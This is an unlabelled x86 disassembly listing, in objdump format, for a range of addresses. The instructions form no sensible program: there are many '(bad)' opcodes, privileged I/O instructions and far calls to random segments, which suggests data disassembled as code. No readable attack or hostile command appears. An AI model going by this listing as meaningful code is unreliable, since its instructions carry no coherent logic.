  410d37:	sar    DWORD PTR [ecx-0x29],cl
  410d3a:	jnp    0x410d45
  410d3c:	aam    0x7d
  410d3e:	xchg   dl,cl
  410d40:	icebp  
  410d41:	inc    ebp
  410d42:	mov    al,ds:0x804d630f
  410d47:	fisub  DWORD PTR [ebx+0xbbf3b97]
  410d4d:	int    0x98
  410d4f:	adc    ah,BYTE PTR [ecx-0x10bf8a25]
  410d55:	sar    ecx,1
  410d57:	retf   0x264b
  410d5a:	mov    ds:0x6a9bb281,al
  410d5f:	imul   esp,DWORD PTR [eax],0x740045ba
  410d65:	sbb    BYTE PTR [esi-0x3b],bl
  410d68:	push   es
  410d69:	adc    esi,DWORD PTR [edx-0x60]
  410d6c:	fst    QWORD PTR [edi-0x30]
  410d6f:	sahf   
  410d70:	jmp    0x256d840b
  410d75:	adc    DWORD PTR [ebx-0x21bfc1cd],esi
  410d7b:	adc    eax,0xa6e65583
  410d80:	sub    al,0x23
  410d82:	aas    
  410d83:	push   edi
  410d84:	inc    ebp
  410d85:	call   0x3c85:0xb0f53561
  410d8c:	xor    DWORD PTR [esi+0x3422d697],esp
  410d92:	lahf   
  410d93:	outs   dx,BYTE PTR ds:[esi]
  410d94:	dec    edi
  410d95:	retf   
  410d96:	cli    
  410d97:	mov    gs,ecx
  410d99:	shl    BYTE PTR [edx+esi*4],1
  410d9c:	addr16 loopne 0x410d4f
  410d9f:	aam    0xc8
  410da1:	xchg   BYTE PTR [ecx+0x735b969b],cl
  410da7:	mov    ch,0x6e
  410da9:	out    dx,eax
  410daa:	mov    ds:0x5ad86229,eax
  410daf:	fs je  0x410e18
  410db2:	int    0x29
  410db4:	clc    
  410db5:	call   0xa2084dd4
  410dba:	cmp    BYTE PTR [edi],ah
  410dbc:	out    0x65,eax
  410dbe:	add    DWORD PTR [esi+0x6114297b],0xffffffcc
  410dc5:	imul   eax,eax,0xffffffc6
  410dc8:	stc    
  410dc9:	jg     0x410dfd
  410dcb:	dec    esi
  410dcc:	scas   eax,DWORD PTR es:[edi]
  410dcd:	int    0x2f
  410dcf:	mov    al,ds:0x89d4a7fb
  410dd4:	dec    ecx
  410dd5:	xor    cl,BYTE PTR [esi-0x7b]
  410dd8:	test   BYTE PTR ds:[ecx+0x20],bl
  410ddc:	sti    
  410ddd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410dde:	addr16 push ds
  410de0:	mov    DWORD PTR [eax-0x6],ebx
  410de3:	xor    al,0x43
  410de5:	fnstsw WORD PTR [ebp-0x40]
  410de8:	jb     0x410d8f
  410dea:	pop    ds
  410deb:	xor    BYTE PTR [ebx],bl
  410ded:	das    
  410dee:	jl     0x410d8e
  410df0:	rcr    DWORD PTR [ebx+0x5760bdd7],1
  410df6:	test   DWORD PTR [edx-0x6a],0x9e6389ee
  410dfd:	fiadd  WORD PTR [eax]
  410dff:	lods   eax,DWORD PTR ds:[esi]
  410e00:	sbb    esp,DWORD PTR [ebp-0x41]
  410e03:	xor    al,0x24
  410e05:	hlt    
  410e06:	lods   al,BYTE PTR ds:[esi]
  410e07:	pop    es
  410e08:	cmp    DWORD PTR [esi],eax
  410e0a:	cld    
  410e0b:	mov    ds:0x7b2eeeb1,eax
  410e10:	mov    ch,0x85
  410e12:	adc    edi,DWORD PTR [ebx]
  410e14:	sbb    esp,DWORD PTR [esi]
  410e16:	fisttp WORD PTR [esi+0x54]
  410e19:	loop   0x410e86
  410e1b:	fs sub esp,ebp
  410e1e:	(bad)  
  410e1f:	push   edx
  410e20:	call   0xd7d5:0x3242077d
  410e27:	mov    dl,0xb7
  410e29:	(bad)  
  410e2a:	hlt    
  410e2b:	or     eax,DWORD PTR [edi-0x29e0a768]
  410e31:	(bad)  
  410e32:	sub    al,0x9a
  410e34:	mov    ch,BYTE PTR ds:0x572895bd
  410e3a:	fwait
  410e3b:	lods   al,BYTE PTR ds:[esi]
  410e3c:	xchg   edi,esi
  410e3e:	leave  
  410e3f:	out    dx,al
  410e40:	jl     0x410df1
  410e42:	popf   
  410e43:	mov    ecx,0x29b272cd
  410e48:	dec    edi
  410e49:	mov    DWORD PTR [ecx-0xbbde874],0x19c496e0
  410e53:	pop    ebx
  410e54:	xor    ebp,ecx
  410e56:	test   al,0xe3
  410e58:	pop    es
  410e59:	popf   
  410e5a:	sti    
  410e5b:	ret    0x7f9d
  410e5e:	xchg   esi,eax
  410e5f:	stc    
  410e60:	shr    cl,cl
  410e62:	xchg   DWORD PTR [ebx+ebx*8],esi
  410e65:	mov    al,ds:0xa84d1074
  410e6a:	mov    al,0x65
  410e6c:	shr    BYTE PTR [eax+0x60],0xee
  410e70:	mov    edx,0x536c86a4
  410e75:	jo     0x410ef0
  410e77:	jmp    0x410e72
  410e79:	and    DWORD PTR [esi-0x90687c3],0x26b55036
  410e83:	lahf   
  410e84:	and    bh,BYTE PTR [eax-0x70]
  410e87:	mov    bl,0x4e
  410e89:	cdq    
  410e8a:	xchg   bl,ah
  410e8c:	add    BYTE PTR [edx-0x3b],bh
  410e8f:	sbb    DWORD PTR [eax-0x77],edx
  410e92:	add    esi,ebp
  410e94:	stc    
  410e95:	xor    BYTE PTR [ecx-0x67],bh
  410e98:	stc    
  410e99:	jecxz  0x410eeb
  410e9b:	inc    esi
  410e9c:	inc    edi
  410e9d:	sbb    al,0x1e
  410e9f:	mov    dl,0xc0
  410ea1:	jp     0x410e50
  410ea3:	push   esi
  410ea4:	or     eax,0x89b6a31b
  410ea9:	pop    eax
  410eaa:	jecxz  0x410ec4
  410eac:	int    0x62
  410eae:	fmul   DWORD PTR gs:[ebp-0x24679e9e]
  410eb5:	jecxz  0x410ec2
  410eb7:	rcl    BYTE PTR [ecx-0xda78d6e],0x42
  410ebe:	dec    eax
  410ebf:	pop    ebx
  410ec0:	sbb    DWORD PTR [eax+0x29],ecx
  410ec3:	cdq    
  410ec4:	mov    BYTE PTR [eax+0x49],dl
  410ec7:	inc    esp
  410ec8:	ret    
  410ec9:	shl    BYTE PTR [edx-0x4fd08796],1
  410ecf:	sar    DWORD PTR ds:0xf7f68703,1
  410ed5:	popf   
  410ed6:	or     cl,ah
  410ed8:	mov    cl,0x97
  410eda:	out    dx,eax
  410edb:	push   0x13
  410edd:	es cmp eax,0x75d2920a
  410ee3:	pop    ds
  410ee4:	push   es
  410ee5:	sub    eax,0x2638fc0
  410eea:	not    DWORD PTR [esi-0x38]
  410eed:	xlat   BYTE PTR ds:[ebx]
  410eee:	int    0x1f
  410ef0:	(bad)  [edx-0x74]
  410ef3:	cdq    
  410ef4:	mov    ebx,0x8356ccbe
  410ef9:	jmp    0xe9c7:0x650450f9
  410f00:	in     eax,0x17
  410f02:	retf   
  410f03:	inc    esp
  410f04:	cmc    
  410f05:	fist   WORD PTR [eax-0x78]
  410f08:	mov    al,0x6e
  410f0a:	pop    ebx
  410f0b:	push   ds
  410f0c:	xor    BYTE PTR [ebp+0x40],dh
  410f0f:	or     dh,BYTE PTR [ebx-0xf45a406]
  410f15:	adc    bh,dh
  410f17:	sub    eax,0xd16698d
  410f1c:	jns    0x410f1e
  410f1e:	out    dx,al
  410f1f:	pinsrw mm6,WORD PTR [ecx],0x66
  410f23:	(bad)  
  410f24:	mov    ecx,0xefaf1b48
  410f29:	stos   DWORD PTR es:[edi],eax
  410f2a:	dec    ecx
  410f2b:	or     ebx,esi
  410f2d:	cmp    bl,BYTE PTR [edx+ecx*8]
  410f30:	(bad)  
  410f31:	sbb    al,0x7e
  410f33:	push   ds
  410f34:	or     al,0x6c
  410f36:	or     BYTE PTR [ecx+0x5d],bh
  410f39:	xchg   dh,cl
  410f3b:	mov    ebx,0xd86889df
  410f40:	jecxz  0x410f78
  410f42:	fldpi  
  410f44:	xchg   ebx,eax
  410f45:	sub    dh,cl
  410f47:	push   ebp
  410f48:	imul   edi,esi,0xffffffa9
  410f4b:	loope  0x410f50
  410f4d:	ins    BYTE PTR es:[edi],dx
  410f4e:	gs pop edi
  410f50:	fsub   QWORD PTR [ecx]
  410f52:	or     eax,DWORD PTR [edi]
  410f54:	jns    0x410fc3
  410f56:	mov    al,ds:0x219eaa3f
  410f5b:	icebp  
  410f5c:	jbe    0x410f80
  410f5e:	popa   
  410f5f:	push   esp
  410f60:	inc    ebx
  410f61:	xchg   ebx,eax
  410f62:	lea    ebx,ds:0xf42415
  410f68:	xlat   BYTE PTR ds:[ebx]
  410f69:	cmp    DWORD PTR [edi],esp
  410f6b:	call   0xe7bd:0xbe9bf7f2
  410f72:	inc    eax
  410f73:	sar    BYTE PTR [ebp+0x2d],1
  410f76:	mov    al,ds:0x151e83ec
  410f7b:	jge    0x410f3b
  410f7d:	or     ebx,DWORD PTR [edi-0x787501f8]
  410f83:	(bad)  
  410f84:	(bad)  
  410f86:	neg    DWORD PTR [edx+0x6d]
  410f89:	jmp    0x410fd7
  410f8b:	popa   
  410f8c:	imul   ecx,DWORD PTR [ebx-0x51],0x84d9266e
  410f93:	out    dx,eax
  410f94:	aas    
  410f95:	es pop ss
  410f97:	ss jo  0x410fea
  410f9a:	out    0xd1,eax
  410f9c:	imul   eax,DWORD PTR [ebx-0x358e2a73],0xfffffffa
  410fa3:	xor    al,0xf3
  410fa5:	loope  0x410f2c
  410fa7:	pop    ecx
  410fa8:	add    eax,0xef37824b
  410fad:	ja     0x410fc2
  410faf:	sub    DWORD PTR [ebp-0x27],0x61e4d119
  410fb6:	test   eax,0xb96eb08d
  410fbb:	icebp  
  410fbc:	enter  0x8d05,0x2c
  410fc0:	mov    edx,0xf3331493
  410fc5:	outs   dx,DWORD PTR ds:[esi]
  410fc6:	adc    ch,dh
  410fc8:	sub    BYTE PTR [edi+0x43c8d69e],dh
  410fce:	mov    ds:0x155bdd79,eax
  410fd3:	retf   0x36a0
  410fd6:	loopne 0x411039
  410fd8:	lahf   
  410fd9:	xchg   edi,esi
  410fdb:	fcmovb st,st(7)
  410fdd:	and    dl,al
  410fdf:	mov    eax,ds:0x3e2b6790
  410fe4:	and    cl,BYTE PTR [esp+eiz*2]
  410fe7:	repz mov edx,0x2999149e
  410fed:	mov    cl,0xb4
  410fef:	mov    ah,0xe1
  410ff1:	add    eax,0x47e475cc
  410ff6:	push   0x987b12e3
  410ffb:	dec    ebx
  410ffc:	fimul  DWORD PTR [ebx]
  410ffe:	call   0xcd9689cf
  411003:	repnz test DWORD PTR [edi+0x35],ebx
  411007:	pop    edx
  411008:	pusha  
  411009:	jbe    0x411068
  41100b:	ret    
  41100c:	xchg   DWORD PTR [eax+0x6699e0a5],esi
  411012:	pop    ebx
  411013:	and    esp,ebx
  411015:	mov    DWORD PTR [edi-0x17f43acb],eax
  41101b:	bswap  edi
  41101d:	jb     0x411016
  41101f:	ret    
  411020:	nop
  411021:	pop    edi
  411022:	cmp    ebx,0x18
  411025:	xchg   BYTE PTR [eax],cl
  411027:	sub    al,cl
  411029:	or     DWORD PTR [ecx],edi
  41102b:	stos   DWORD PTR es:[edi],eax
  41102c:	xchg   esi,eax
  41102d:	sub    bl,bh
  41102f:	mov    ch,0xa
  411031:	jno    0x411010
  411033:	popa   
  411034:	inc    edi
  411035:	pop    eax
  411036:	in     eax,0xba
  411038:	(bad)  
  411039:	fist   WORD PTR [ebp-0x5a]
  41103c:	mov    esi,edx
  41103e:	add    ecx,DWORD PTR [ecx-0x5a516b51]
  411044:	cli    
  411045:	mov    dl,BYTE PTR [eax-0x2ba0d80f]
  41104b:	(bad)  
  41104c:	xor    BYTE PTR [esi],bh
  41104e:	mov    ecx,0x850188a1
  411053:	or     BYTE PTR [ebx+0x78],bh
  411056:	nop    DWORD PTR [ebx-0x43d9736d]
  41105d:	std    
  41105e:	or     dh,BYTE PTR [ecx]
  411060:	repz mov ds:0x92cf1921,al
  411066:	ret    0xcb4e
  411069:	fadd   QWORD PTR [esp+ebp*1-0x45e985d3]
  411070:	push   ecx
  411071:	inc    edx
  411072:	xchg   ebx,eax
  411073:	mov    eax,ebx
  411075:	xor    al,0x94
  411077:	mov    dh,0x7c
  411079:	jmp    0x4110e5
  41107b:	into   
  41107c:	pop    ebp
  41107d:	scas   eax,DWORD PTR es:[edi]
  41107e:	jb     0x411029
  411080:	pop    es
  411081:	mov    eax,0x7c5a864
  411086:	stos   DWORD PTR es:[edi],eax
  411087:	dec    ecx
  411088:	pop    ss
  411089:	iret   
  41108a:	stc    
  41108b:	jmp    0x7320:0xf15357b
  411092:	mov    eax,0x1021b42e
  411097:	mov    ds:0x44a0e4a3,eax
  41109c:	mul    esi
  41109e:	clc    
  41109f:	push   edi
  4110a0:	(bad)  
  4110a1:	out    0x1e,al
  4110a3:	loop   0x4110fc
  4110a5:	ficom  DWORD PTR [esi]
  4110a7:	cli    
  4110a8:	jle    0x41103d
  4110aa:	(bad)  
  4110ab:	xor    DWORD PTR [eax-0x4a5f9693],0xffffffc5
  4110b2:	fisttp DWORD PTR [eax]
  4110b4:	sub    al,0x18
  4110b6:	push   esp
  4110b7:	or     al,0x25
  4110b9:	pop    edx
  4110ba:	sub    DWORD PTR [ebx-0x5baa028a],esi
  4110c0:	mov    ds:0xea76789b,al
  4110c5:	jp     0x41113c
  4110c7:	jge    0x411130
  4110c9:	add    eax,0x8e6084ba
  4110ce:	in     eax,0x19
  4110d0:	leave  
  4110d1:	cmp    eax,0x15af4dca
  4110d6:	sahf   
  4110d7:	or     al,0xe8
  4110d9:	out    dx,al
  4110da:	and    BYTE PTR [ebx+esi*2-0x172abf95],0x27
  4110e2:	shl    DWORD PTR [ebx-0x378adb48],0x25
  4110e9:	push   es
  4110ea:	stc    
  4110eb:	shl    DWORD PTR [edx+0x7fe81eee],cl
  4110f1:	jno    0x411081
  4110f3:	and    eax,0xeea0c4e1
  4110f8:	and    eax,0x176d0df2
  4110fd:	pop    ebp
  4110fe:	xor    cl,BYTE PTR [edi-0x4dc1a6a9]
  411104:	outs   dx,DWORD PTR ds:[esi]
  411105:	out    dx,al
  411106:	push   edi
  411107:	xchg   ebx,eax
  411108:	(bad)  
  411109:	jno    0x411145
  41110b:	mov    dh,0x66
  41110d:	out    0xb8,al
  41110f:	mov    dh,0xef
  411111:	push   cs
  411112:	ins    DWORD PTR es:[edi],dx
  411113:	and    al,0x38
  411115:	mov    edx,0xd05947e5
  41111a:	fmulp  st(7),st
  41111c:	mov    esp,0x5eae8f11
  411121:	mov    edi,0x3027b5f5
  411126:	xchg   edi,eax
  411127:	scas   al,BYTE PTR es:[edi]
  411128:	fiadd  DWORD PTR [ecx+0x1c]
  41112b:	dec    edx
  41112c:	push   ss
  41112d:	push   esi
  41112e:	xor    ecx,DWORD PTR [ecx+0x594ed8b6]
  411134:	imul   ebx,eax,0xe34f999e
  41113a:	iret   
  41113b:	and    eax,0x25d43a14
  411140:	sbb    eax,0xa00d6001
  411145:	clc    
  411146:	push   edi
  411147:	mov    dh,BYTE PTR gs:[eax+0x1ce2c109]
  41114e:	xor    DWORD PTR [esi-0x18],esp
  411151:	les    esp,FWORD PTR [ebp-0x36a13eef]
  411157:	sahf   
  411158:	test   DWORD PTR [ebp+0x2a],0x513abc58
  41115f:	stc    
  411160:	lods   eax,DWORD PTR ds:[esi]
  411161:	pop    esi
  411162:	and    eax,ebp
  411164:	add    ch,dh
  411166:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  411168:	cmp    BYTE PTR [ebx+0x3f],0x66
  41116c:	loope  0x411188
  41116e:	xor    DWORD PTR [ebx-0x7f],ebp
  411171:	xor    BYTE PTR [edx-0x4c],bl
  411174:	mov    BYTE PTR [esp+ecx*4-0x5e2dde2a],ch
  41117b:	xchg   ebx,eax
  41117c:	cdq    
  41117d:	mov    cs,WORD PTR [ebx]
  41117f:	jae    0x4111e7
  411181:	gs retf 
  411183:	inc    ebx
  411184:	or     al,0x37
  411186:	pop    esp
  411187:	mov    ecx,DWORD PTR [ecx+ebp*4-0x571f2ec6]
  41118e:	pminub mm1,QWORD PTR [ebp-0x47]
  411192:	sbb    DWORD PTR [ebx-0x52f98f54],edi
  411198:	push   edi
  411199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41119a:	jno    0x41120e
  41119c:	cmc    
  41119d:	cwde   
  41119e:	test   eax,0x8b974722
  4111a3:	cmp    BYTE PTR [ebx-0x30202bfb],ah
  4111a9:	out    0xd6,al
  4111ab:	sbb    al,0x4e
  4111ad:	(bad)  
  4111ae:	mov    bl,0x69
  4111b0:	std    
  4111b1:	mov    ah,0xb
  4111b3:	(bad)  
  4111b4:	icebp  
  4111b5:	inc    eax
  4111b6:	or     cl,BYTE PTR [esi]
  4111b8:	jecxz  0x411239
  4111ba:	and    edi,ecx
  4111bc:	sub    BYTE PTR [eax+0x4b],0xbc
  4111c0:	pop    es
  4111c1:	xor    BYTE PTR [edi],al
  4111c3:	data16 scas al,BYTE PTR es:[edi]
  4111c5:	je     0x4111d9
  4111c7:	lea    edi,[esi]
  4111c9:	std    
  4111ca:	loopne 0x41114c
  4111cc:	adc    al,0x3d
  4111ce:	jge    0x41116c
  4111d0:	xchg   esi,eax
  4111d1:	sbb    eax,edx
  4111d3:	icebp  
  4111d4:	rcr    eax,cl
  4111d6:	mov    BYTE PTR [esi-0x769fde9a],ch
  4111dc:	out    0x49,al
  4111de:	jg     0x4111f6
  4111e0:	mov    dh,0x31
  4111e2:	pop    es
  4111e3:	int    0x22
  4111e5:	mov    ecx,0x36ee94f3
  4111ea:	xor    DWORD PTR [esi+0x60],ebp
  4111ed:	stc    
  4111ee:	js     0x411187
  4111f0:	mov    ds,eax
  4111f2:	cdq    
  4111f3:	inc    ebp
  4111f4:	stos   DWORD PTR es:[edi],eax
  4111f5:	dec    ecx
  4111f6:	(bad)  
  4111f7:	or     bl,ah
  4111f9:	test   BYTE PTR [edx-0x1c],dh
  4111fc:	add    DWORD PTR [ecx-0x2e],0xffffffb0
  411200:	adc    esi,DWORD PTR [ecx-0x5c]
  411203:	lds    eax,FWORD PTR [esi+esi*1+0x75]
  411207:	adc    BYTE PTR [edx],al
  411209:	pushf  
  41120a:	mov    esi,0xe84237dd
  41120f:	dec    ebx
  411210:	sbb    al,0xeb
  411212:	inc    esi
  411213:	arpl   WORD PTR [edx],sp
  411215:	test   DWORD PTR [ebx-0x1f],ebp
  411218:	retf   0xffc5
  41121b:	push   0x3d383824
  411220:	sub    eax,0x90512d29
  411225:	inc    ecx
  411226:	cs jecxz 0x411259
  411229:	shl    dl,1
  41122b:	push   0xffffffbc
  41122d:	fidivr DWORD PTR [edx+eiz*1]
  411230:	sub    eax,0x8d6f2226
  411235:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411236:	aad    0x1a
  411238:	sahf   
  411239:	std    
  41123a:	or     eax,0x6a2f636c
  41123f:	mov    eax,ds:0x417f423c
  411244:	jp     0x4111d6
  411246:	bound  edx,QWORD PTR [eax+ecx*4+0x47]
  41124a:	mov    al,0x2
  41124c:	mov    esp,0xc442992b
  411251:	push   ebx
  411252:	xor    edi,DWORD PTR [edx-0x42a20aaf]
  411258:	jmp    0x411204
  41125a:	sub    BYTE PTR [edx+0x56],dl
  41125d:	(bad)  
  41125e:	fistp  WORD PTR [eax+0x6ce8695d]
  411264:	nop
  411265:	xor    ecx,eax
  411267:	js     0x4112b4
  411269:	push   0xedc6c15f
  41126e:	mov    edx,eax
  411270:	rcl    BYTE PTR [ebp+0x3],cl
  411273:	pop    ds
  411274:	push   esp
  411275:	sahf   
  411276:	xchg   ebp,eax
  411277:	inc    esi
  411278:	call   0x666:0x88224df7
  41127f:	and    DWORD PTR [ebx+0xf],0xffffffbe
  411283:	cmp    edx,DWORD PTR [esi+0x55]
  411286:	mov    ebp,0x4e95a75c
  41128b:	pop    es
  41128c:	rol    DWORD PTR [ebp+0xb],0x35
  411290:	pop    es
  411291:	repz test DWORD PTR [edx+0x7cc4c17d],0xa410266a
  41129c:	fcmove st,st(7)
  41129e:	fist   DWORD PTR [edi-0x4c2708fc]
  4112a4:	xor    ch,cl
  4112a6:	(bad)  
  4112a8:	push   ebp
  4112a9:	mov    esp,0xcc4559dc
  4112ae:	sub    al,0xfd
  4112b0:	mov    eax,ds:0x47cd5d30
  4112b5:	fisttp WORD PTR [ebx+0x26]
  4112b8:	in     eax,dx
  4112b9:	loope  0x41127d
  4112bb:	cmp    al,0xcc
  4112bd:	imul   esp,ebp,0x865a2ea
  4112c3:	adc    al,0x1b
  4112c5:	xor    DWORD PTR ds:[edi-0x3433cc70],eax
  4112cc:	jne    0x411264
  4112ce:	cdq    
  4112cf:	int    0x54
  4112d1:	jno    0x411336
  4112d3:	gs cdq 
  4112d5:	xor    esp,DWORD PTR [edi+0x55]
  4112d8:	lea    eax,[edx]
  4112da:	jne    0x41130c
  4112dc:	adc    BYTE PTR [eax+0x53],bh
  4112df:	cmp    ah,BYTE PTR [edi]
  4112e1:	fwait
  4112e2:	les    esp,FWORD PTR [esp+ebx*4]
  4112e5:	push   0x52d3fd84
  4112ea:	mov    ecx,0x7ae323ff
  4112ef:	jle    0x411315
  4112f1:	mov    ?,WORD PTR [eax-0x3b]
  4112f4:	mov    ebx,0x4ba020c7
  4112f9:	mov    ecx,0x4fbb8e79
  4112fe:	jne    0x411300
  411300:	(bad)  
  411301:	ins    DWORD PTR es:[edi],dx
  411302:	push   esi
  411303:	inc    eax
  411304:	ss and dh,dh
  411307:	xchg   DWORD PTR ds:0x36126e8a,ebx
  41130d:	pushf  
  41130e:	and    al,0x1d
  411310:	xchg   ebx,eax
  411311:	stos   DWORD PTR es:[edi],eax
  411312:	repnz inc sp
  411315:	add    cl,bh
  411317:	daa    
  411318:	add    eax,0x515b2588
  41131d:	div    BYTE PTR [ebp+0xaa54d]
  411323:	jle    0x411347
  411325:	shr    DWORD PTR [ecx],cl
  411327:	repnz repnz lock adc al,0x4e
  41132c:	cmc    
  41132d:	fs aaa 
  41132f:	mov    eax,0x63376ad4
  411334:	int3   
  411335:	add    DWORD PTR [ebp+0x2269300d],esp
  41133b:	in     eax,dx
  41133c:	xor    ebx,DWORD PTR [eax+ebp*4-0x5306641b]
  411343:	test   ebp,0x6a0fb511
  411349:	out    dx,al
  41134a:	dec    ebp
  41134b:	mov    esp,0x5a5b34b8
  411350:	pop    es
  411351:	mov    edi,0x6a25ef17
  411356:	aam    0x8a
  411358:	cmp    DWORD PTR [ebp+0x36c7816b],esi
  41135e:	push   eax
  41135f:	inc    ebx
  411360:	push   0xfcd6b877
  411365:	sbb    dh,BYTE PTR [ebx-0x33985f6a]
  41136b:	and    dl,cl
  41136d:	pop    ecx
  41136e:	xor    ax,0x1d16
  411372:	imul   eax,eax,0x29034667
  411378:	fst    st(4)
  41137a:	xor    al,0xec
  41137c:	lahf   
  41137d:	ja     0x4113cb
  41137f:	into   
  411380:	push   esp
  411381:	adc    DWORD PTR [edi+0x25],ebp
  411384:	outs   dx,DWORD PTR cs:[esi]
  411386:	push   edx
  411387:	mov    dh,0x2
  411389:	adc    edx,DWORD PTR [edi+0x6b]
  41138c:	mov    dl,BYTE PTR [esi+eax*8-0x15]
  411390:	or     dl,bh
  411392:	scas   eax,DWORD PTR es:[edi]
  411393:	fild   DWORD PTR [ebp+0x66]
  411396:	repz sbb ebx,eax
  411399:	aaa    
  41139a:	and    al,0x1e
  41139c:	dec    esp
  41139d:	push   es
  41139e:	sbb    eax,0x9be06e2
  4113a3:	xchg   ecx,eax
  4113a4:	cmp    esi,DWORD PTR [edi+0x49d70f44]
  4113aa:	cmc    
  4113ab:	and    eax,0xe202e504
  4113b0:	jb     0x411336
  4113b2:	outs   dx,DWORD PTR ds:[esi]
  4113b3:	fcmove st,st(6)
  4113b5:	hlt    
  4113b6:	inc    ebp
  4113b7:	jecxz  0x41137c
  4113b9:	mov    ebx,0xf4680bb8
  4113be:	mul    ebx
  4113c0:	pop    ss
  4113c1:	mov    DWORD PTR [edi-0x7aad20c3],esp
  4113c7:	jbe    0x41141f
  4113c9:	add    BYTE PTR [ebp+edx*4+0x51],bh
  4113cd:	test   DWORD PTR [esi-0x3c8176aa],esi
  4113d3:	retf   
  4113d4:	dec    ebp
  4113d5:	lods   eax,DWORD PTR ds:[esi]
  4113d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113d7:	adc    ch,dl
  4113d9:	out    0x8f,al
  4113db:	aam    0xec
  4113dd:	popf   
  4113de:	pop    edi
  4113df:	out    dx,al
  4113e0:	xchg   ebx,eax
  4113e1:	(bad)  
  4113e2:	lods   al,BYTE PTR ds:[esi]
  4113e3:	es std 
  4113e5:	pop    esi
  4113e6:	ins    BYTE PTR es:[edi],dx
  4113e7:	popf   
  4113e8:	dec    ebp
  4113e9:	jb     0x411408
  4113eb:	push   ebp
  4113ec:	aas    
  4113ed:	fwait
  4113ee:	ret    0xcc64
  4113f1:	retf   0xfce4
  4113f4:	adc    al,0xc
  4113f6:	pusha  
  4113f7:	xchg   edx,eax
  4113f8:	es (bad) 
  4113fb:	dec    ebx
  4113fc:	cmc    
  4113fd:	pop    edx
  4113fe:	add    DWORD PTR [ecx],0xffffffe1
  411401:	dec    ecx
  411402:	cmp    eax,0x723fa6c2
  411407:	popa   
  411408:	mov    esp,0x84571f97
  41140d:	std    
  41140e:	jnp    0x41139d
  411410:	pop    es
  411411:	arpl   dx,ax
  411413:	push   ds
  411414:	or     dl,BYTE PTR [esi+0x4]
  411417:	add    ecx,DWORD PTR [ecx]
  411419:	cmp    eax,0x33f43d66
  41141e:	cs inc esi
  411420:	sbb    ecx,DWORD PTR [ecx]
  411422:	and    al,0x5e
  411424:	ds pop ebx
  411426:	in     eax,0x88
  411428:	jl     0x411436
  41142a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41142b:	xchg   esi,eax
  41142c:	bnd jle 0x4113c4
  41142f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411430:	mov    si,0xfddd
  411434:	mov    edi,0xddbe27e
  411439:	lods   eax,DWORD PTR ds:[esi]
  41143a:	mov    ebp,0x7051f3e1
  41143f:	pop    eax
  411440:	push   edi
  411441:	xchg   ebp,eax
  411442:	sub    dl,dh
  411444:	fucomi st,st(7)
  411446:	xchg   di,ax
  411448:	sbb    al,0x9d
  41144a:	xor    DWORD PTR [ebx+esi*1+0x23],edi
  41144e:	in     eax,dx
  41144f:	xor    eax,0x15711306
  411454:	dec    ebx
  411455:	test   DWORD PTR [eax+esi*8+0x20],eax
  411459:	xor    eax,0xd5308dac
  41145e:	stos   BYTE PTR es:[edi],al
  41145f:	out    0xb9,al
  411461:	in     al,dx
  411462:	fs inc eax
  411464:	mov    cl,0xb4
  411466:	mov    ecx,0x5e08ae02
  41146b:	shl    BYTE PTR [edi-0x75],1
  41146e:	neg    ebx
  411470:	cld    
  411471:	fucomi st,st(5)
  411473:	dec    BYTE PTR [edi-0x396200e0]
  411479:	in     eax,dx
  41147a:	out    0xba,al
  41147c:	bound  esp,QWORD PTR [esi+0x612ff324]
  411482:	dec    ecx
  411483:	xchg   ebp,eax
  411484:	popa   
  411485:	cmp    al,0xed
  411487:	adc    BYTE PTR [edx+ebp*4-0x24d9b705],0xfa
  41148f:	jae    0x411499
  411491:	fs mov bh,0x5f
  411494:	into   
  411495:	sub    BYTE PTR [ebx],bl
  411497:	cli    
  411498:	stos   DWORD PTR es:[edi],eax
  411499:	mov    ebx,DWORD PTR [edx]
  41149b:	dec    ebx
  41149c:	ror    BYTE PTR ds:0x8c7e3a6,0x6d
  4114a3:	loop   0x411493
  4114a5:	add    dl,ah
  4114a7:	push   eax
  4114a9:	jmp    0x4114e2
  4114ab:	std    
  4114ac:	fsubr  DWORD PTR [ecx]
  4114ae:	xor    al,0xc1
  4114b0:	and    eax,0xb9cbb8d2
  4114b5:	int3   
  4114b6:	pop    ds
  4114b7:	push   esi
  4114b8:	mov    cl,0xd2
  4114ba:	into   
  4114bb:	add    al,0x4d
  4114bd:	jecxz  0x41148a
  4114bf:	inc    esp
  4114c0:	sar    BYTE PTR [ecx+eiz*8-0x5d],0x8d
  4114c5:	adc    DWORD PTR [ebp-0xf480450],ebx
  4114cb:	jge    0x411540
  4114cd:	inc    edi
  4114ce:	shl    ebx,cl
  4114d0:	pop    esp
  4114d1:	sbb    BYTE PTR [ebx+0x3eee7da],ah
  4114d7:	xlat   BYTE PTR ds:[ebx]
  4114d8:	add    BYTE PTR ds:0x9843ac7e,cl
  4114de:	aas    
  4114df:	jmp    0x9cadfc52
  4114e4:	jmp    0x4114db
  4114e6:	sbb    dh,BYTE PTR [edi]
  4114e8:	hlt    
  4114e9:	xchg   BYTE PTR [edi],dh
  4114eb:	or     al,0x5b
  4114ed:	popf   
  4114ee:	(bad)  
  4114ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114f0:	jge    0x411546
  4114f2:	lods   al,BYTE PTR ds:[esi]
  4114f3:	leave  
  4114f4:	loope  0x411534
  4114f6:	(bad)  
  4114f7:	or     BYTE PTR [edi+0x4c30abae],dh
  4114fd:	mov    esp,0x77d99087
  411502:	push   edi
  411503:	cmp    BYTE PTR [di+0x5674],dl
  411508:	loop   0x4114f8
  41150a:	das    
  41150b:	ret    
  41150c:	pop    es
  41150d:	rcr    DWORD PTR [eax],0xbe
  411510:	xor    al,0x4
  411512:	mov    dh,BYTE PTR [ebx]
  411514:	xchg   DWORD PTR [edx+edx*4-0x46661ec5],ebx
  41151b:	dec    eax
  41151c:	add    al,0xb6
  41151e:	shr    al,cl
  411520:	jle    0x411562
  411522:	lods   eax,DWORD PTR ds:[esi]
  411523:	int3   
  411524:	push   es
  411525:	ror    cl,cl
  411527:	aaa    
  411528:	lods   eax,DWORD PTR ds:[esi]
  411529:	pop    DWORD PTR [ebx+0x40ac9adb]
  41152f:	cmc    
